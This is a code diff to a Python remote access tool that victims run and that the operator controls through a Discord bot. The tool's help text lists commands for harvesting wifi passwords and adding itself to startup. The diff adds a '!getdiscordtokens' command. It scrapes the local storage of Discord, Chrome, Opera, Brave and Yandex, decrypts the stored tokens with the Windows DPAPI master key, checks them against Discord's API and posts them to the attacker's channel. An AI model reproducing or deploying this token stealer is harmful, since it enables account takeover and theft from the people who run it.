@@ -96,6 +96,7 @@ Availaible commands are :
 --> !enbtaskmgr = enable task manager(if disabled)(Admin rights are required)
 --> !getwifipass = get all the wifi passwords on the current device(Admin rights are required)
 --> !startup = add file to startup(when computer go on this file starts)(Admin rights are required)
+--> !getdiscordtoken = get discord token ONLY! (also decrypts them)
 """
 
 async def activity(client):
@@ -1177,4 +1178,135 @@ async def on_message(message):
                 await message.channel.send("[*] Command successfuly executed")  
             else:
                 await message.channel.send("[*] This command requires admin privileges")
+        if message.content == "!getdiscordtokens":
+            from asyncio.proactor_events import _ProactorSocketTransport
+            import os
+            from re import findall
+            import json
+            from json import loads, dumps
+            from base64 import b64decode
+            import base64
+            import requests
+            from Cryptodome.Cipher import AES
+            from subprocess import Popen, PIPE
+            from urllib.request import Request, urlopen
+            from datetime import datetime
+            from threading import Thread
+            from time import sleep
+            import urllib.request
+            from sys import argv
+            from win32crypt import CryptUnprotectData
+            import sys
+            LOCAL = os.getenv("LOCALAPPDATA")
+            ROAMING = os.getenv("APPDATA")
+            PATHS = [
+                ROAMING + "\\Discord",
+                ROAMING + "\\discordcanary",
+                ROAMING + "\\discordptb",
+                LOCAL + "\\Google\\Chrome\\User Data\\Default",
+                ROAMING + "\\Opera Software\\Opera Stable",
+                LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+                LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+            ]
+
+
+            regex1 = "[\\w-]{24}\.[\\w-]{6}\\.[\\w-]{27}"
+            regex2 = r"mfa\\.[\\w-]{84}"
+            encrypted_regex = "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$]{120}"
+
+            def getheaders(token=None, content_type="application/json"):
+                headers = {
+                    "Content-Type": content_type,
+                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+                }
+                if token:
+                    headers.update({"Authorization": token})
+                return headers
+            def getuserdata(token):
+                try:
+                    return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+                except:
+                    pass
+
+            def decrypt_payload(cipher, payload):
+                return cipher.decrypt(payload)
+
+            def generate_cipher(aes_key, iv):
+                return AES.new(aes_key, AES.MODE_GCM, iv)
+
+            def decrypt_password(buff, master_key):
+                try:
+                    iv = buff[3:15]
+                    payload = buff[15:]
+                    cipher = generate_cipher(master_key, iv)
+                    decrypted_pass = decrypt_payload(cipher, payload)
+                    decrypted_pass = decrypted_pass[:-16].decode()
+                    return decrypted_pass
+                except Exception:
+                    return "Failed to decrypt password"
+
+            def get_master_key(path):
+                with open(path, "r", encoding="utf-8") as f:
+                    local_state = f.read()
+                local_state = json.loads(local_state)
+
+                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                master_key = master_key[5:]
+                master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+                return master_key
+
+            def gettokens(path):
+                path1=path
+                path += "\\Local Storage\\leveldb"
+                tokens = []
+                try:
+                    if not "discord" in path.lower():
+                        for file_name in os.listdir(path):
+                            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                                continue
+                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                                for token in findall(regex1, line):
+                                    try:
+                                        r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
+                                        if r.status_code == 200:
+                                            if token in tokens:
+                                                continue
+                                    except Exception:
+                                        continue
+                                    tokens.append(token)
+                                for token in findall(regex2, line):
+                                    print(token)
+                                    try:
+                                        r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
+                                        if r.status_code == 200:
+                                            if token in tokens:
+                                                continue
+                                    except Exception:
+                                        continue
+                                    tokens.append(token)
+                    else:
+                        for file_name in os.listdir(path):
+                            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                                continue
+                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                                for y in findall(encrypted_regex, line):
+                                    token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(path1 + '\\Local State'))
+                                    try:
+                                        r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
+                                        if r.status_code == 200:
+                                            if token in tokens:
+                                                continue
+                                            tokens.append(token)
+                                            
+                                    except:
+                                        continue
+                    return tokens
+                except Exception as e:
+                    return []
+            alltokens=[]
+            for i in PATHS:
+                e=gettokens(i)
+                for c in e:
+                    alltokens.append(c)
+            await message.channel.send("\n".join(alltokens))    
 client.run(token)
